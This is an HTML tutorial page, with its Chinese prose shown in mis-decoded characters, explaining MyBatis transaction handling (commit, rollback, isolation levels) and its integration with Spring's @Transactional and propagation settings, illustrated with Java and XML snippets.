<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88043f1eb1954c0aa444d887b77c8e91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768005633&amp;x-signature=HG3Tu1H0iREvZBlYbz%2BvtIoBvlc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">3.1 äº‹åŠ¡ç”Ÿå‘½å‘¨æœŸ</h2>
<p>ä¸€ä¸ªå®Œæ•´çš„äº‹åŠ¡ç”Ÿå‘½å‘¨æœŸåŒ…æ‹¬ä»¥ä¸‹é˜¶æ®µï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// 1. å¼€å¯äº‹åŠ¡
SqlSession <span class="hljs-attr">session</span> = sqlSessionFactory.openSession()<span class="hljs-comment">;</span>

try {
    // 2. æ‰§è¡Œæ•°æ®åº“æ“ä½œ
    User <span class="hljs-attr">user</span> = new User(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"zhangsan@example.com"</span>)<span class="hljs-comment">;</span>
    userMapper.insert(user)<span class="hljs-comment">;</span>

    Order <span class="hljs-attr">order</span> = new Order(user.getId(), <span class="hljs-string">"iPhone 15"</span>, <span class="hljs-number">6999</span>)<span class="hljs-comment">;</span>
    orderMapper.insert(order)<span class="hljs-comment">;</span>

    // 3. æäº¤äº‹åŠ¡
    session.commit()<span class="hljs-comment">;</span>
} catch (Exception e) {
    // 4. å›æ»šäº‹åŠ¡
    session.rollback()<span class="hljs-comment">;</span>
    throw e<span class="hljs-comment">;</span>
} finally {
    // 5. å…³é—­ä¼šè¯
    session.close()<span class="hljs-comment">;</span>
}
</code></pre>
<h2 data-id="heading-8">3.2 è‡ªåŠ¨æäº¤ä¸æ‰‹åŠ¨æäº¤</h2>
<p>MyBatisæ”¯æŒä¸¤ç§äº‹åŠ¡æäº¤æ¨¡å¼ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// è‡ªåŠ¨æäº¤æ¨¡å¼ï¼šæ¯æ¡SQLè‡ªåŠ¨æäº¤
SqlSession <span class="hljs-attr">session</span> = sqlSessionFactory.openSession(<span class="hljs-literal">true</span>)<span class="hljs-comment">;</span>
try {
    User <span class="hljs-attr">user</span> = new User(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"zhangsan@example.com"</span>)<span class="hljs-comment">;</span>
    userMapper.insert(user)<span class="hljs-comment">;</span>
    // æ— éœ€æ‰‹åŠ¨æäº¤ï¼Œè‡ªåŠ¨æäº¤
} finally {
    session.close()<span class="hljs-comment">;</span>
}
// æ‰‹åŠ¨æäº¤æ¨¡å¼ï¼šéœ€è¦æ˜¾å¼æäº¤
SqlSession <span class="hljs-attr">session</span> = sqlSessionFactory.openSession(<span class="hljs-literal">false</span>)<span class="hljs-comment">;</span>
try {
    User <span class="hljs-attr">user</span> = new User(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"zhangsan@example.com"</span>)<span class="hljs-comment">;</span>
    userMapper.insert(user)<span class="hljs-comment">;</span>

    Order <span class="hljs-attr">order</span> = new Order(user.getId(), <span class="hljs-string">"iPhone 15"</span>, <span class="hljs-number">6999</span>)<span class="hljs-comment">;</span>
    orderMapper.insert(order)<span class="hljs-comment">;</span>

    // å¤šæ¡SQLåœ¨åŒä¸€äº‹åŠ¡ä¸­
    session.commit()<span class="hljs-comment">; // æ˜¾å¼æäº¤</span>
} catch (Exception e) {
    session.rollback()<span class="hljs-comment">; // æ˜¾å¼å›æ»š</span>
    throw e<span class="hljs-comment">;</span>
} finally {
    session.close()<span class="hljs-comment">;</span>
}
</code></pre>
<h2 data-id="heading-9">3.3 Executorä¸­çš„äº‹åŠ¡ç®¡ç†</h2>
<p>Executoråœ¨æ‰§è¡ŒSQLæ—¶ä¼šæ¶‰åŠåˆ°äº‹åŠ¡ç®¡ç†ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">public abstract class BaseExecutor implements Executor {
    private Transaction transaction;

    <span class="hljs-keyword">@Override</span>
    public int <span class="hljs-attribute">update</span>(MappedStatement ms, Object parameter) 
            throws SQLException {
        ErrorContext<span class="hljs-selector-class">.instance</span>()<span class="hljs-selector-class">.begin</span>(ms.getId(), 
            ms<span class="hljs-selector-class">.getSqlSource</span>()<span class="hljs-selector-class">.getBoundSql</span>(parameter));
        try {
            <span class="hljs-comment">// æ¸…ç©ºä¸€çº§ç¼“å­˜</span>
            <span class="hljs-built_in">clearLocalCache</span>();

            <span class="hljs-comment">// æ‰§è¡Œæ›´æ–°æ“ä½œ</span>
            return <span class="hljs-built_in">doUpdate</span>(ms, parameter);
        } catch (SQLException e) {
            throw ExceptionFactory<span class="hljs-selector-class">.wrapException</span>(
                "Error updating database. Cause: " + e, e);
        } finally {
            ErrorContext<span class="hljs-selector-class">.instance</span>()<span class="hljs-selector-class">.end</span>();
        }
    }

    <span class="hljs-keyword">@Override</span>
    public void commit(boolean required) throws SQLException {
        if (closed) {
            throw new <span class="hljs-built_in">ExecutorException</span>(
                "Cannot commit, transaction is already closed");
        }

        <span class="hljs-comment">// æ¸…ç©ºä¸€çº§ç¼“å­˜</span>
        <span class="hljs-built_in">clearLocalCache</span>();

        <span class="hljs-comment">// åˆ·æ–°æ‰¹å¤„ç†</span>
        <span class="hljs-built_in">flushStatements</span>();

        <span class="hljs-comment">// æäº¤äº‹åŠ¡</span>
        if (required) {
            transaction<span class="hljs-selector-class">.commit</span>();
        }
    }

    <span class="hljs-keyword">@Override</span>
    public void rollback(boolean required) throws SQLException {
        if (closed) {
            throw new <span class="hljs-built_in">ExecutorException</span>(
                "Cannot rollback, transaction is already closed");
        }

        <span class="hljs-comment">// æ¸…ç©ºä¸€çº§ç¼“å­˜</span>
        <span class="hljs-built_in">clearLocalCache</span>();

        <span class="hljs-comment">// åˆ·æ–°æ‰¹å¤„ç†</span>
        <span class="hljs-built_in">flushStatements</span>(true);

        <span class="hljs-comment">// å›æ»šäº‹åŠ¡</span>
        if (required) {
            transaction<span class="hljs-selector-class">.rollback</span>();
        }
    }
}
</code></pre>
<h2 data-id="heading-10">å››ã€äº‹åŠ¡æäº¤å’Œå›æ»šæœºåˆ¶</h2>
<p>äº‹åŠ¡çš„æäº¤å’Œå›æ»šæ˜¯ä¿è¯æ•°æ®ä¸€è‡´æ€§çš„æ ¸å¿ƒæœºåˆ¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78544a13f1134e4da78dd202dce2cbef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768005633&amp;x-signature=ME4kkWLpcZp0n5uHO1Nl2PWwI58%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11">4.1 äº‹åŠ¡æäº¤æµç¨‹</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// SqlSessionä¸­çš„æäº¤å®ç°</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">commit</span><span class="hljs-params">()</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">commit</span> <span class="hljs-operator">=</span> required;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ‰§è¡Œæ‰€æœ‰æŒ‚èµ·çš„SQLè¯­å¥</span>
        flushStatements();

        <span class="hljs-keyword">if</span> (commit) {
            <span class="hljs-comment">// å§”æ‰˜ç»™Executoræäº¤</span>
            executor.commit(isCommitOrRollbackRequired(<span class="hljs-literal">false</span>));
        }
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">throw</span> ExceptionFactory.wrapException(
            <span class="hljs-string">"Error committing transaction. Cause: "</span> + e, e);
    }
}

<span class="hljs-comment">// Executorä¸­çš„æäº¤å®ç°</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">commit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> required)</span> <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">if</span> (closed) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(
            <span class="hljs-string">"Cannot commit, transaction is already closed"</span>);
    }

    <span class="hljs-keyword">if</span> (required) {
        <span class="hljs-comment">// æ¸…ç©ºä¸€çº§ç¼“å­˜</span>
        clearLocalCache();

        <span class="hljs-comment">// åˆ·æ–°æ‰¹å¤„ç†</span>
        flushStatements();

        <span class="hljs-comment">// æäº¤æ•°æ®åº“äº‹åŠ¡</span>
        transaction.commit();
    }
}
</code></pre>
<h2 data-id="heading-12">4.2 äº‹åŠ¡å›æ»šæµç¨‹</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// SqlSessionä¸­çš„å›æ»šå®ç°</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rollback</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ‰§è¡Œæ‰€æœ‰æŒ‚èµ·çš„SQLè¯­å¥</span>
        flushStatements(<span class="hljs-literal">true</span>);

        <span class="hljs-comment">// å§”æ‰˜ç»™Executorå›æ»š</span>
        executor.rollback(isCommitOrRollbackRequired(<span class="hljs-literal">true</span>));
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">throw</span> ExceptionFactory.wrapException(
            <span class="hljs-string">"Error rolling back transaction. Cause: "</span> + e, e);
    }
}

<span class="hljs-comment">// Executorä¸­çš„å›æ»šå®ç°</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rollback</span><span class="hljs-params">(<span class="hljs-type">boolean</span> required)</span> <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">if</span> (closed) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(
            <span class="hljs-string">"Cannot rollback, transaction is already closed"</span>);
    }

    <span class="hljs-keyword">if</span> (required) {
        <span class="hljs-comment">// æ¸…ç©ºä¸€çº§ç¼“å­˜</span>
        clearLocalCache();

        <span class="hljs-comment">// åˆ·æ–°æ‰¹å¤„ç†</span>
        flushStatements(<span class="hljs-literal">true</span>);

        <span class="hljs-comment">// å›æ»šæ•°æ®åº“äº‹åŠ¡</span>
        transaction.rollback();
    }
}
</code></pre>
<h2 data-id="heading-13">4.3 å›æ»šè§¦å‘æ¡ä»¶</h2>
<p>ä»¥ä¸‹æƒ…å†µä¼šè§¦å‘äº‹åŠ¡å›æ»šï¼š</p>
<pre><code class="hljs language-ini" lang="ini">try {
    userMapper.insert(user)<span class="hljs-comment">;</span>
    orderMapper.insert(order)<span class="hljs-comment">;</span>
    session.commit()<span class="hljs-comment">;</span>
} catch (Exception e) {
    session.rollback()<span class="hljs-comment">;</span>
    throw e<span class="hljs-comment">;</span>
}
if (!isValid(order)) {
    session.rollback()<span class="hljs-comment">;</span>
    return<span class="hljs-comment">;</span>
}
session.commit()<span class="hljs-comment">;</span>
SqlSession <span class="hljs-attr">session</span> = sqlSessionFactory.openSession(
    ExecutorType.BATCH)<span class="hljs-comment">;</span>
try {
    List&lt;User&gt; <span class="hljs-attr">users</span> = getBatchUsers()<span class="hljs-comment">;</span>
    for (User user : users) {
        userMapper.insert(user)<span class="hljs-comment">;</span>
    }
    session.commit()<span class="hljs-comment">;</span>
} catch (Exception e) {
    session.rollback()<span class="hljs-comment">;</span>
    throw e<span class="hljs-comment">;</span>
} finally {
    session.close()<span class="hljs-comment">;</span>
}
</code></pre>
<h2 data-id="heading-14">4.4 äº‹åŠ¡éš”ç¦»çº§åˆ«</h2>
<p>MyBatisæ”¯æŒæ ‡å‡†çš„JDBCäº‹åŠ¡éš”ç¦»çº§åˆ«ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">public enum IsolationLevel {
    <span class="hljs-attribute">NONE</span>(Connection.TRANSACTION_NONE),
    <span class="hljs-built_in">READ_COMMITTED</span>(Connection.TRANSACTION_READ_COMMITTED),
    <span class="hljs-built_in">READ_UNCOMMITTED</span>(Connection.TRANSACTION_READ_UNCOMMITTED),
    <span class="hljs-built_in">REPEATABLE_READ</span>(Connection.TRANSACTION_REPEATABLE_READ),
    <span class="hljs-built_in">SERIALIZABLE</span>(Connection.TRANSACTION_SERIALIZABLE);

    public int <span class="hljs-built_in">getLevel</span>() {
        return level;
    }
}
</code></pre>
<p>é…ç½®æ–¹å¼ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- åœ¨mybatis-config.xmlä¸­é…ç½® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"defaultTransactionIsolationLevel"</span> 
             <span class="hljs-attr">value</span>=<span class="hljs-string">"READ_COMMITTED"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>

<span class="hljs-comment">&lt;!-- åœ¨DataSourceä¸­é…ç½® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"POOLED"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"driver"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${driver}"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"url"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${url}"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${username}"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${password}"</span>/&gt;</span>
    <span class="hljs-comment">&lt;!-- è®¾ç½®é»˜è®¤éš”ç¦»çº§åˆ« --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"defaultTransactionIsolationLevel"</span> 
              <span class="hljs-attr">value</span>=<span class="hljs-string">"2"</span>/&gt;</span> <span class="hljs-comment">&lt;!-- READ_COMMITTED --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span>
</code></pre>
<h2 data-id="heading-15">äº”ã€ä¸Springæ¡†æ¶é›†æˆ</h2>
<p>åœ¨å®é™…é¡¹ç›®ä¸­,MyBatisé€šå¸¸ä¸Springé›†æˆ,ç”±Springç»Ÿä¸€ç®¡ç†äº‹åŠ¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a723c4cc44d4275b56e7742e41ff8e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768005633&amp;x-signature=rtIcddWP9rgg3zVHG5Rpo3lh2NA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-16">5.1 Springäº‹åŠ¡é…ç½®</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- é…ç½®äº‹åŠ¡ç®¡ç†å™¨ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"transactionManager"</span> 
      <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"dataSource"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

<span class="hljs-comment">&lt;!-- é…ç½®äº‹åŠ¡é€šçŸ¥ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">tx:advice</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"txAdvice"</span> <span class="hljs-attr">transaction-manager</span>=<span class="hljs-string">"transactionManager"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tx:attributes</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tx:method</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"select*"</span> <span class="hljs-attr">read-only</span>=<span class="hljs-string">"true"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tx:method</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"get*"</span> <span class="hljs-attr">read-only</span>=<span class="hljs-string">"true"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tx:method</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"query*"</span> <span class="hljs-attr">read-only</span>=<span class="hljs-string">"true"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tx:method</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"*"</span> <span class="hljs-attr">propagation</span>=<span class="hljs-string">"REQUIRED"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tx:attributes</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">tx:advice</span>&gt;</span>

<span class="hljs-comment">&lt;!-- é…ç½®äº‹åŠ¡åˆ‡é¢ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">aop:config</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">aop:pointcut</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"servicePointcut"</span> 
                  <span class="hljs-attr">expression</span>=<span class="hljs-string">"execution(* com.example.service.*.*(..))"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">aop:advisor</span> <span class="hljs-attr">advice-ref</span>=<span class="hljs-string">"txAdvice"</span> 
                 <span class="hljs-attr">pointcut-ref</span>=<span class="hljs-string">"servicePointcut"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">aop:config</span>&gt;</span>
@Configuration
@EnableTransactionManagement
public class MyBatisConfig {

    @Bean
    public DataSourceTransactionManager transactionManager(
            DataSource dataSource) {
        return new DataSourceTransactionManager(dataSource);
    }

    @Bean
    public SqlSessionFactoryBean sqlSessionFactory(
            DataSource dataSource) throws Exception {
        SqlSessionFactoryBean sessionFactory = 
            new SqlSessionFactoryBean();
        sessionFactory.setDataSource(dataSource);
        sessionFactory.setMapperLocations(
            new PathMatchingResourcePatternResolver()
                .getResources("classpath:mapper/*.xml"));
        return sessionFactory;
    }

    @Bean
    public MapperScannerConfigurer mapperScannerConfigurer() {
        MapperScannerConfigurer scanner = 
            new MapperScannerConfigurer();
        scanner.setBasePackage("com.example.mapper");
        return scanner;
    }
}
</code></pre>
<h2 data-id="heading-17">5.2 ä½¿ç”¨@Transactionalæ³¨è§£</h2>
<p>åœ¨Serviceå±‚ä½¿ç”¨@Transactionalæ³¨è§£ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">UserMapper</span> userMapper;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">OrderMapper</span> orderMapper;

    <span class="hljs-comment">// é»˜è®¤äº‹åŠ¡ç®¡ç†</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createUserWithOrder</span>(<span class="hljs-params">User user, Order order</span>) {
        userMapper.<span class="hljs-title function_">insert</span>(user);
        orderMapper.<span class="hljs-title function_">insert</span>(order);
    }

    <span class="hljs-comment">// åªè¯»äº‹åŠ¡</span>
    <span class="hljs-meta">@Transactional</span>(readOnly = <span class="hljs-literal">true</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> <span class="hljs-title function_">getUserById</span>(<span class="hljs-params">Long id</span>) {
        <span class="hljs-keyword">return</span> userMapper.<span class="hljs-title function_">selectById</span>(id);
    }

    <span class="hljs-comment">// æŒ‡å®šéš”ç¦»çº§åˆ«</span>
    <span class="hljs-meta">@Transactional</span>(isolation = <span class="hljs-title class_">Isolation</span>.<span class="hljs-property">READ_COMMITTED</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateUser</span>(<span class="hljs-params">User user</span>) {
        userMapper.<span class="hljs-title function_">update</span>(user);
    }

    <span class="hljs-comment">// æŒ‡å®šä¼ æ’­è¡Œä¸º</span>
    <span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRES_NEW</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">logOperation</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> operation</span>) {
        <span class="hljs-comment">// åœ¨æ–°äº‹åŠ¡ä¸­æ‰§è¡Œ</span>
    }

    <span class="hljs-comment">// æŒ‡å®šå›æ»šå¼‚å¸¸</span>
    <span class="hljs-meta">@Transactional</span>(rollbackFor = {<span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>})
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">Long fromId, Long toId, BigDecimal amount</span>) {
        userMapper.<span class="hljs-title function_">decrease</span>(fromId, amount);
        userMapper.<span class="hljs-title function_">increase</span>(toId, amount);
    }

    <span class="hljs-comment">// ä¸å›æ»šç‰¹å®šå¼‚å¸¸</span>
    <span class="hljs-meta">@Transactional</span>(noRollbackFor = {<span class="hljs-title class_">BusinessException</span>.<span class="hljs-property">class</span>})
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">processWithBusinessException</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// ...</span>
    }

    <span class="hljs-comment">// è¶…æ—¶è®¾ç½®</span>
    <span class="hljs-meta">@Transactional</span>(timeout = <span class="hljs-number">30</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">longRunningOperation</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<h2 data-id="heading-18">5.3 Springäº‹åŠ¡ä¼ æ’­è¡Œä¸º</h2>
<p>Springæ”¯æŒå¤šç§äº‹åŠ¡ä¼ æ’­è¡Œä¸ºï¼š</p>













































<table><thead><tr><th>ä¼ æ’­è¡Œä¸º</th><th>è¯´æ˜</th><th>ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>REQUIRED(é»˜è®¤)</td><td>å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡,åˆ™åŠ å…¥å¦åˆ™åˆ›å»ºæ–°äº‹åŠ¡</td><td>å¤§å¤šæ•°æƒ…å†µ</td></tr><tr><td>REQUIRES_NEW</td><td>æ€»æ˜¯åˆ›å»ºæ–°äº‹åŠ¡æŒ‚èµ·å½“å‰äº‹åŠ¡</td><td>æ—¥å¿—è®°å½•å®¡è®¡</td></tr><tr><td>SUPPORTS</td><td>å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡,åˆ™åŠ å…¥å¦åˆ™éäº‹åŠ¡æ‰§è¡Œ</td><td>æŸ¥è¯¢æ“ä½œ</td></tr><tr><td>NOT_SUPPORTED</td><td>æ€»æ˜¯éäº‹åŠ¡æ‰§è¡ŒæŒ‚èµ·å½“å‰äº‹åŠ¡</td><td>æ‰¹é‡å¯¼å…¥</td></tr><tr><td>NEVER</td><td>æ€»æ˜¯éäº‹åŠ¡æ‰§è¡Œå¦‚æœå­˜åœ¨äº‹åŠ¡åˆ™æŠ›å¼‚å¸¸</td><td>ä¸éœ€è¦äº‹åŠ¡çš„æ“ä½œ</td></tr><tr><td>MANDATORY</td><td>å¿…é¡»åœ¨äº‹åŠ¡ä¸­æ‰§è¡Œå¦åˆ™æŠ›å¼‚å¸¸</td><td>å¿…é¡»æœ‰äº‹åŠ¡çš„æ“ä½œ</td></tr><tr><td>NESTED</td><td>å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡åˆ™åµŒå¥—æ‰§è¡Œ</td><td>åµŒå¥—ä¸šåŠ¡é€»è¾‘</td></tr></tbody></table>
<h2 data-id="heading-19">5.4 é›†æˆç¤ºä¾‹</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> PaymentService paymentService;

    <span class="hljs-comment">// ä¸»æµç¨‹ï¼šä½¿ç”¨REQUIREDä¼ æ’­</span>
    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRED)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºç”¨æˆ·ï¼ˆåŠ å…¥å½“å‰äº‹åŠ¡ï¼‰</span>
        userService.updateUserBalance(
            order.getUserId(), 
            order.getAmount().negate());

        <span class="hljs-comment">// 2. åˆ›å»ºè®¢å•ï¼ˆåŠ å…¥å½“å‰äº‹åŠ¡ï¼‰</span>
        orderMapper.insert(order);

        <span class="hljs-comment">// 3. æ”¯ä»˜ï¼ˆåŠ å…¥å½“å‰äº‹åŠ¡ï¼‰</span>
        paymentService.processPayment(order);

        <span class="hljs-comment">// äº‹åŠ¡æäº¤</span>
    }

    <span class="hljs-comment">// æ”¯ä»˜æœåŠ¡ï¼šREQUIRES_NEWï¼Œç‹¬ç«‹äº‹åŠ¡</span>
    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processPayment</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-comment">// åœ¨æ–°äº‹åŠ¡ä¸­æ‰§è¡Œ</span>
        paymentMapper.insert(order);
    }

    <span class="hljs-comment">// å¼‚å¸¸å¤„ç†ï¼šè‡ªåŠ¨å›æ»š</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transfer</span><span class="hljs-params">(Long fromId, Long toId, 
                        BigDecimal amount)</span> {
        <span class="hljs-keyword">try</span> {
            userService.decrease(fromId, amount);
            userService.increase(toId, amount);
            <span class="hljs-comment">// æˆåŠŸï¼šè‡ªåŠ¨æäº¤</span>
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// å¤±è´¥ï¼šè‡ªåŠ¨å›æ»š</span>
            <span class="hljs-keyword">throw</span> e;
        }
    }
}
</code></pre>
<h2 data-id="heading-20">å…­ã€äº‹åŠ¡ä¼ æ’­æœºåˆ¶</h2>
<p>äº‹åŠ¡ä¼ æ’­å®šä¹‰äº†äº‹åŠ¡æ–¹æ³•è¢«è°ƒç”¨æ—¶äº‹åŠ¡è¾¹ç•Œçš„è¡Œä¸ºã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4624412659e4e16b76d7db137b46ae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768005633&amp;x-signature=OCANyrEM0ryl28nch8dVKULCiF0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-21">6.1 ä¼ æ’­è¡Œä¸ºè¯¦è§£</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRED</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">methodA</span>(<span class="hljs-params"/>) {
    <span class="hljs-title function_">methodB</span>();  <span class="hljs-comment">// åŠ å…¥methodAçš„äº‹åŠ¡</span>
}

<span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRED</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">methodB</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// ...</span>
}
